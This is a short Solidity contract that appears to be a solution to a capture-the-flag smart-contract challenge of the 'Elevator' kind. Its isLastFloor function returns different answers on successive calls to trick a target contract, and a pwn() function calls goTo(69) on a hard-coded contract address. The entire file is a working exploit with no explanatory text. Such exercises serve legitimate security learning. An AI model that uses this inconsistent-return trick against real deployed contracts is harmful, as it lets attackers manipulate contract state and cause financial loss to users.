// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Building {
    bool second;

    constructor() {
        second = false;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool res = second;
        second = true;
        return res;
    }

    function pwn() public {
        0x79F00D53D0395cC329816BfF3bA76C61e104718f.call(
            abi.encodeWithSignature("goTo(uint256)", 69)
        );
    }
}
